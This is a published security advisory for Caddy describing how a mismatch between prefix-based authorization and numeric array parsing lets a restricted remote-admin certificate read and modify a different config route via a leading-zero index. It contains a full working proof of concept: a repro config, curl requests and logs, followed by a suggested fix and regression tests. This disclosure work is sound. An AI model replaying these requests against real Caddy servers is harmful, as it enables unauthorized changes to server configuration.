# [M] Caddy: Remote Admin Authorization Bypass in `/config` API via Array Index Normalization

## Summary
Severity: Medium
Advisory: GHSA-x5w9-xh9r-mvfc
CVE: CVE-2026-45692
CWE: CWE-187, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-x5w9-xh9r-mvfc
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=2.4.0 <2.11.3

## Details
This report is not about a normal textual prefix-expansion case.

 The issue here is that the authorization layer and the `/config` traversal layer do **not agree on what object the path refers to**.

  In this case, a path authorized for one config object is accepted, but then resolves to a **different config object** during traversal. 

  ## AI Disclosure

  The reporter used an LLM to help review the code, reason about the behavior, and help draft this report.
  The reporter manually reproduced and validated the issue locally, confirmed the relevant source paths, and captured the requests and responses below.

  ## Summary

  A remote admin client certificate restricted to the following path:

  ```text
  /config/apps/http/servers/srv/routes/0
```
  can still read and modify a different array element by requesting:

  /config/apps/http/servers/srv/routes/01

  This happens because:

  - the authorization layer uses string prefix matching
  - the /config traversal layer parses array indices numerically using strconv.Atoi()

  So:

  - authorization sees /.../01 as matching /.../0
  - traversal resolves 01 to numeric index 1
  - the request therefore targets routes[1], not routes[0]

  This is not just a prefix-match quirk. It is an authorization-to-object mismatch.

  ## Why This Is In Scope

  This is a security bug in Caddy's own code:

  - no browser behavior is involved
  - no dependency bug is involved
  - no external system compromise is involved
  - no third-party software compromise is required
  - no unsafe content hosting or file upload is required

  This is also not just “an unsafe configuration”.

  The configuration explicitly attempts to limit access to one specific path:

  /config/apps/http/servers/srv/routes/0

  But Caddy enforces a policy that ends up granting access to a different object (routes[1]) because of how traversal interprets the final path component.

  In short:

  - configured authorization target: routes[0]
  - actual accessed object: routes[1]

  That difference is caused by Caddy itself.

  ## Relevant Source Code

  Authorization path matching:

  - admin.go:719

  Authorization config comment:

  - admin.go:213

  Config traversal with numeric parsing:

  - admin.go:1201
  - admin.go:1310

  ## Root Cause

  ### Authorization layer

```
  for _, allowedPath := range accessPerm.Paths {
  	if strings.HasPrefix(r.URL.Path, allowedPath) {
  		pathFound = true
  		break
  	}
  }
```

  ### Traversal layer

  idx, err = strconv.Atoi(idxStr)

  and later:

  partInt, err := strconv.Atoi(part)

  Because of that:

  - allowed path: /config/.../routes/0
  - requested path: /config/.../routes/01
  - authorization decision: allowed
  - actual object selected: routes[1]

  ## Why This Is Not Just a “Prefix” Case

  For a normal path hierarchy, a “subpath” means a child resource of the same authorized object.

  For example:

  - /config/apps/http
  - /config/apps/http/servers
  - /config/apps/http/servers/srv/routes/0/handle

  Those are genuine deeper descendants.

  But this case is different.

  Within the /config API, the final path component after /routes/ is not just a text fragment. It is a semantic selector for an array index.

  So:

  - /routes/0 means routes[0]
  - /routes/01 means routes[1]
  - /routes/02 means routes[2]

  That means /routes/01 is not a child of routes[0] in object semantics.
  It is a different array element entirely.

  So even if prefix matching is documented, this case is different because:

  - authorization uses the textual form
  - traversal uses the numeric form
  - the two refer to different objects

  This should be treated as an authorization bug rather than a documented prefix behavior.

  ## Security Impact

  A remote admin identity restricted to one /config array element can:

  - read a different array element
  - modify a different array element

  This breaks least-privilege remote admin policies.

  In practice, a delegated certificate that should only be able to inspect or edit one route can instead inspect or edit another route in the same array.

  ## Affected Product

  Tested on:

  v2.11.2-3-gdf65455b

  Affected area:

  - remote admin
  - admin.remote.access_control.permissions.paths
  - /config API paths containing numeric array indices

  The reporter reproduced this on current HEAD.


  ## Minimal Reproduction Configuration

```
  {
    "storage": {
      "module": "file_system",
      "root": "/tmp/caddy-config-index-storage"
    },
    "admin": {
      "listen": "127.0.0.1:2029",
      "identity": {
        "identifiers": ["localhost"],
        "issuers": [
          { "module": "internal" }
        ]
      },
      "remote": {
        "listen": "127.0.0.1:2031",
        "access_control": [
          {
            "public_keys": ["<CLIENT_CERT_BASE64_DER>"],
            "permissions": [
              {
                "methods": ["GET", "PATCH"],
                "paths": ["/config/apps/http/servers/srv/routes/0"]
              }
            ]
          }
        ]
      }
    },
    "apps": {
      "http": {
        "servers": {
          "srv": {
            "listen": [":9088"],
            "routes": [
              {
                "handle": [
                  {
                    "handler": "static_response",
                    "body": "route zero"
                  }
                ]
              },
              {
                "handle": [
                  {
                    "handler": "static_response",
                    "body": "route one"
                  }
                ]
              }
            ]
          }
        }
      }
    }
  }
```

  ## Commands

  ### 1. Generate client certificate

```
  openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
    -subj '/CN=remote-admin-client' \
    -keyout client.key \
    -out client.crt
```

  ### 2. Convert to base64 DER

```
  CLIENT_CERT_B64="$(openssl x509 -in client.crt -outform der | base64 | tr -d '\n')"
```
  ### 3. Start Caddy
```
  go run ./cmd/caddy run --config ./repro.json
```
  ## Specific Minimal Reproduction Steps

  ### Step 1: Read the explicitly authorized object
```
  curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/0
```
  Observed result:
```
  < HTTP/1.1 200 OK
  {"handle":[{"body":"route zero","handler":"static_response"}]}
```
  ### Step 2: Read a different object using a leading-zero index
```
  curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
```
  Observed result:
```
  < HTTP/1.1 200 OK
  {"handle":[{"body":"route one","handler":"static_response"}]}
```
  This shows that a client limited to routes/0 can read routes[1].

  ### Step 3: Confirm that the traversal layer is interpreting the component numerically
```
  curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/02
```
  Observed result:
```
  < HTTP/1.1 400 Bad Request
  {"error":"[/config/apps/http/servers/srv/routes/02] array index out of bounds: 02"}
```
  This is important because it shows Caddy is not treating 01 and 02 as ordinary child paths under 0. It is treating them as numeric indices.

  ### Step 4: Modify the unauthorized object
```
  curl -vk \
    -X PATCH \
    --resolve localhost:2031:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    -H 'Content-Type: application/json' \
    --data '{"handle":[{"handler":"static_response","body":"patched route one"}]}' \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
```
  Observed result:
```
  < HTTP/1.1 200 OK
```
  ### Step 5: Confirm the unauthorized modification
```
  curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
```
  Observed result:
```
  < HTTP/1.1 200 OK
  {"handle":[{"body":"patched route one","handler":"static_response"}]}
```
  That confirms the client was able to modify routes[1], even though only /routes/0 was authorized.

  ## Precise Requests and Captured Output

  ### Authorized read
```
  > GET /config/apps/http/servers/srv/routes/0 HTTP/1.1
  > Host: localhost:2031
  > User-Agent: curl/8.5.0
  > Accept: */*
  <
  < HTTP/1.1 200 OK
  < Content-Type: application/json
  < Etag: "/config/apps/http/servers/srv/routes/0 94a6828ccc924cf3"
  <
  {"handle":[{"body":"route zero","handler":"static_response"}]}
```
  ### Unauthorized read
```
  > GET /config/apps/http/servers/srv/routes/01 HTTP/1.1
  > Host: localhost:2031
  > User-Agent: curl/8.5.0
  > Accept: */*
  <
  < HTTP/1.1 200 OK
  < Content-Type: application/json
  < Etag: "/config/apps/http/servers/srv/routes/01 ed4a6c7e6ac8890d"
  <
  {"handle":[{"body":"route one","handler":"static_response"}]}
```
  ### Numeric index interpretation evidence
```
  > GET /config/apps/http/servers/srv/routes/02 HTTP/1.1
  > Host: localhost:2031
  > User-Agent: curl/8.5.0
  > Accept: */*
  <
  < HTTP/1.1 400 Bad Request
  <
  {"error":"[/config/apps/http/servers/srv/routes/02] array index out of bounds: 02"}
```
  ### Unauthorized modification
```
  > PATCH /config/apps/http/servers/srv/routes/01 HTTP/1.1
  > Host: localhost:2031
  > User-Agent: curl/8.5.0
  > Accept: */*
  > Content-Type: application/json
  > Content-Length: 69
  <
  < HTTP/1.1 200 OK
```
  ### Confirmation of unauthorized modification
```
  > GET /config/apps/http/servers/srv/routes/01 HTTP/1.1
  > Host: localhost:2031
  > User-Agent: curl/8.5.0
  > Accept: */*
  <
  < HTTP/1.1 200 OK
  < Content-Type: application/json
  < Etag: "/config/apps/http/servers/srv/routes/01 a757e3a3168ca4e0"
  <
  {"handle":[{"body":"patched route one","handler":"static_response"}]}
```
  ## Full Log Output

  Relevant startup logs from the reproduction run:

```
root@dbdd95a60758:/caddy# go run ./cmd/caddy run --config /tmp/caddy-config-index-repro.json
2026/03/20 02:10:51.148	INFO	maxprocs: Leaving GOMAXPROCS=16: CPU quota undefined
2026/03/20 02:10:51.148	INFO	GOMEMLIMIT is updated	{"GOMEMLIMIT": 26273105510, "previous": 9223372036854775807}
2026/03/20 02:10:51.148	INFO	using config from file	{"file": "/tmp/caddy-config-index-repro.json"}
2026/03/20 02:10:51.149	INFO	admin	admin endpoint started	{"address": "127.0.0.1:2029", "enforce_origin": false, "origins": ["//localhost:2029", "//[::1]:2029", "//127.0.0.1:2029"]}
2026/03/20 02:10:51.149	WARN	http	HTTP/2 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:10:51.149	WARN	http	HTTP/3 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:10:51.149	INFO	http.log	server running	{"name": "srv", "protocols": ["h1", "h2", "h3"]}
2026/03/20 02:10:51.149	INFO	tls.cache.maintenance	started background certificate maintenance	{"cache": "0xc0003d7580"}
2026/03/20 02:10:51.149	INFO	admin.identity.cache.maintenance	started background certificate maintenance	{"cache": "0xc00026fd00"}
2026/03/20 02:10:51.149	WARN	admin.identity	stapling OCSP	{"identifiers": ["localhost"]}
2026/03/20 02:10:51.149	INFO	admin.remote	secure admin remote control endpoint started	{"address": "127.0.0.1:2031"}
2026/03/20 02:10:51.149	INFO	autosaved config (load with --resume flag)	{"file": "/root/.config/caddy/autosave.json"}
2026/03/20 02:10:51.149	INFO	serving initial configuration
2026/03/20 02:10:51.156	INFO	tls	storage cleaning happened too recently; skipping for now	{"storage": "FileStorage:/tmp/caddy-config-index-storage", "instance": "55d383b9-7ae1-4713-89a2-b4106612cdcf", "try_again": "2026/03/21 02:10:51.156", "try_again_in": 86399.999999609}
2026/03/20 02:10:51.156	INFO	tls	finished cleaning storage units
2026/03/20 02:11:14.787	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/0", "remote_ip": "127.0.0.1", "remote_port": "59932", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/20 02:11:22.116	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/01", "remote_ip": "127.0.0.1", "remote_port": "40070", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
pkill -f '/tmp/caddy-config-index-repro.json'
^C2026/03/20 02:13:47.114	INFO	shutting down	{"signal": "SIGINT"}
2026/03/20 02:13:47.114	WARN	exiting; byeee!! 👋	{"signal": "SIGINT"}
2026/03/20 02:13:47.114	INFO	http	servers shutting down with eternal grace period
2026/03/20 02:13:47.114	INFO	admin	stopped previous server	{"address": "127.0.0.1:2031"}
2026/03/20 02:13:47.114	INFO	admin	stopped previous server	{"address": "127.0.0.1:2029"}
2026/03/20 02:13:47.114	INFO	shutdown complete	{"signal": "SIGINT", "exit_code": 0}
root@dbdd95a60758:/caddy# pkill -f '/tmp/caddy-config-index-repro.json'
root@dbdd95a60758:/caddy# pkill -f '/tmp/caddy-config-index-repro.json'
root@dbdd95a60758:/caddy# ps -ef | rg 'caddy-config-index-repro|cmd/caddy run --config /tmp/caddy-config-index-repro.json'
bash: rg: command not found
root@dbdd95a60758:/caddy# ss -ltnp | rg ':2029|:2031|:9088'
bash: rg: command not found
root@dbdd95a60758:/caddy# go run ./cmd/caddy run --config /tmp/caddy-config-index-repro.json
2026/03/20 02:14:52.698	INFO	maxprocs: Leaving GOMAXPROCS=16: CPU quota undefined
2026/03/20 02:14:52.698	INFO	GOMEMLIMIT is updated	{"GOMEMLIMIT": 26273105510, "previous": 9223372036854775807}
2026/03/20 02:14:52.698	INFO	using config from file	{"file": "/tmp/caddy-config-index-repro.json"}
2026/03/20 02:14:52.698	INFO	admin	admin endpoint started	{"address": "127.0.0.1:2029", "enforce_origin": false, "origins": ["//localhost:2029", "//[::1]:2029", "//127.0.0.1:2029"]}
2026/03/20 02:14:52.699	WARN	http	HTTP/2 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:14:52.699	WARN	http	HTTP/3 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:14:52.699	INFO	http.log	server running	{"name": "srv", "protocols": ["h1", "h2", "h3"]}
2026/03/20 02:14:52.699	INFO	tls.cache.maintenance	started background certificate maintenance	{"cache": "0xc00011d900"}
2026/03/20 02:14:52.699	INFO	admin.identity.cache.maintenance	started background certificate maintenance	{"cache": "0xc000276800"}
2026/03/20 02:14:52.699	WARN	admin.identity	stapling OCSP	{"identifiers": ["localhost"]}
2026/03/20 02:14:52.699	INFO	admin.remote	secure admin remote control endpoint started	{"address": "127.0.0.1:2031"}
2026/03/20 02:14:52.699	INFO	autosaved config (load with --resume flag)	{"file": "/root/.config/caddy/autosave.json"}
2026/03/20 02:14:52.699	INFO	serving initial configuration
2026/03/20 02:14:52.706	INFO	tls	storage cleaning happened too recently; skipping for now	{"storage": "FileStorage:/tmp/caddy-config-index-storage", "instance": "55d383b9-7ae1-4713-89a2-b4106612cdcf", "try_again": "2026/03/21 02:14:52.706", "try_again_in": 86399.999999659}
2026/03/20 02:14:52.706	INFO	tls	finished cleaning storage units
2026/03/20 02:15:17.145	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/0", "remote_ip": "127.0.0.1", "remote_port": "35382", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/20 02:15:28.746	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/01", "remote_ip": "127.0.0.1", "remote_port": "38998", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/20 02:15:33.180	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/02", "remote_ip": "127.0.0.1", "remote_port": "46698", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/20 02:15:33.180	ERROR	admin.api	request error	{"error": "[/config/apps/http/servers/srv/routes/02] array index out of bounds: 02", "status_code": 400}
2026/03/20 02:15:39.610	INFO	admin.api	received request	{"method": "PATCH", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/01", "remote_ip": "127.0.0.1", "remote_port": "46712", "headers": {"Accept":["*/*"],"Content-Length":["69"],"Content-Type":["application/json"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/20 02:15:39.610	INFO	admin	admin endpoint started	{"address": "127.0.0.1:2029", "enforce_origin": false, "origins": ["//localhost:2029", "//[::1]:2029", "//127.0.0.1:2029"]}
2026/03/20 02:15:39.610	WARN	http	HTTP/2 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:15:39.610	WARN	http	HTTP/3 skipped because it requires TLS	{"network": "tcp", "addr": ":9088"}
2026/03/20 02:15:39.610	INFO	http.log	server running	{"name": "srv", "protocols": ["h1", "h2", "h3"]}
2026/03/20 02:15:39.610	INFO	admin	stopped previous server	{"address": "127.0.0.1:2029"}
2026/03/20 02:15:39.610	INFO	admin.identity.cache.maintenance	stopped background certificate maintenance	{"cache": "0xc000276800"}
2026/03/20 02:15:39.610	INFO	admin.identity.cache.maintenance	started background certificate maintenance	{"cache": "0xc0005b6a00"}
2026/03/20 02:15:39.611	WARN	admin.identity	stapling OCSP	{"identifiers": ["localhost"]}
2026/03/20 02:15:39.611	INFO	admin.remote	secure admin remote control endpoint started	{"address": "127.0.0.1:2031"}
2026/03/20 02:15:39.611	INFO	http	servers shutting down with eternal grace period
2026/03/20 02:15:39.611	INFO	autosaved config (load with --resume flag)	{"file": "/root/.config/caddy/autosave.json"}
2026/03/20 02:15:39.612	INFO	admin	stopped previous server	{"address": "127.0.0.1:2031"}
2026/03/20 02:15:49.018	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2031", "uri": "/config/apps/http/servers/srv/routes/01", "remote_ip": "127.0.0.1", "remote_port": "53712", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
```

```
root@dbdd95a60758:/caddy# curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/0
* Added localhost:2031:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2031...
* Connected to localhost (127.0.0.1) port 2031
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 21:59:41 2026 GMT
*  expire date: Mar 20 09:59:41 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /config/apps/http/servers/srv/routes/0 HTTP/1.1
> Host: localhost:2031
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Content-Type: application/json
< Etag: "/config/apps/http/servers/srv/routes/0 94a6828ccc924cf3"
< Date: Fri, 20 Mar 2026 02:15:17 GMT
< Content-Length: 63
< 
{"handle":[{"body":"route zero","handler":"static_response"}]}
* Connection #0 to host localhost left intact
root@dbdd95a60758:/caddy# curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
* Added localhost:2031:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2031...
* Connected to localhost (127.0.0.1) port 2031
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 21:59:41 2026 GMT
*  expire date: Mar 20 09:59:41 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /config/apps/http/servers/srv/routes/01 HTTP/1.1
> Host: localhost:2031
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Content-Type: application/json
< Etag: "/config/apps/http/servers/srv/routes/01 ed4a6c7e6ac8890d"
< Date: Fri, 20 Mar 2026 02:15:28 GMT
< Content-Length: 62
< 
{"handle":[{"body":"route one","handler":"static_response"}]}
* Connection #0 to host localhost left intact
root@dbdd95a60758:/caddy# curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/02
* Added localhost:2031:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2031...
* Connected to localhost (127.0.0.1) port 2031
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 21:59:41 2026 GMT
*  expire date: Mar 20 09:59:41 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /config/apps/http/servers/srv/routes/02 HTTP/1.1
> Host: localhost:2031
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 400 Bad Request
< Content-Type: application/json
< Date: Fri, 20 Mar 2026 02:15:33 GMT
< Content-Length: 84
< 
{"error":"[/config/apps/http/servers/srv/routes/02] array index out of bounds: 02"}
* Connection #0 to host localhost left intact
root@dbdd95a60758:/caddy# curl -vk \
    -X PATCH \
    --resolve localhost:2031:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    -H 'Content-Type: application/json' \
    --data '{"handle":[{"handler":"static_response","body":"patched route one"}]}' \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
* Added localhost:2031:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2031...
* Connected to localhost (127.0.0.1) port 2031
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 21:59:41 2026 GMT
*  expire date: Mar 20 09:59:41 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> PATCH /config/apps/http/servers/srv/routes/01 HTTP/1.1
> Host: localhost:2031
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 69
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Fri, 20 Mar 2026 02:15:39 GMT
< Content-Length: 0
< Connection: close
< 
* Closing connection
* TLSv1.3 (IN), TLS alert, close notify (256):
* TLSv1.3 (OUT), TLS alert, close notify (256):
root@dbdd95a60758:/caddy# curl -vk \
    --resolve localhost:2031:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2031/config/apps/http/servers/srv/routes/01
* Added localhost:2031:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2031...
* Connected to localhost (127.0.0.1) port 2031
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 21:59:41 2026 GMT
*  expire date: Mar 20 09:59:41 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /config/apps/http/servers/srv/routes/01 HTTP/1.1
> Host: localhost:2031
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Content-Type: application/json
< Etag: "/config/apps/http/servers/srv/routes/01 a757e3a3168ca4e0"
< Date: Fri, 20 Mar 2026 02:15:49 GMT
< Content-Length: 70
< 
{"handle":[{"body":"patched route one","handler":"static_response"}]}
* Connection #0 to host localhost left intact
root@dbdd95a60758:/caddy# 
```

  ## Suggested Fix

  The authorization layer should not allow a path that resolves to a different config object than the one represented by the authorized path.

  A practical fix would be to reject non-canonical numeric array components in /config traversal and/or authorization.

  For example:

  - allow 0
  - allow 1
  - reject 01
  - reject 002

  One possible helper:

```
  func parseCanonicalIndex(s string) (int, error) {
  	if s == "" {
  		return 0, fmt.Errorf("empty index")
  	}
  	if s != "0" && strings.HasPrefix(s, "0") {
  		return 0, fmt.Errorf("non-canonical array index")
  	}
  	return strconv.Atoi(s)
  }
```

  Then use that helper anywhere /config array indices are parsed.

  ## Why This Fix Makes Sense

  This preserves intended config addressing while preventing ambiguous selectors from referring to different objects than the authorization layer appears to permit.

  It would still allow:

  - /routes/0
  - /routes/1

  but reject:

  - /routes/01
  - /routes/002

  That removes the authorization/resource mismatch.

  ## Suggested Regression Tests

  1. Allow /config/apps/http/servers/srv/routes/0, request /.../routes/0, expect allowed.
  2. Allow /config/apps/http/servers/srv/routes/0, request /.../routes/01, expect denied or invalid.
  3. Allow /config/apps/http/servers/srv/routes/0, request /.../routes/02, expect denied or invalid.
  4. With PATCH allowed on /.../routes/0, verify that /.../routes/01 cannot modify routes[1].

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-x5w9-xh9r-mvfc
- https://nvd.nist.gov/vuln/detail/CVE-2026-45692
- https://github.com/caddyserver/caddy
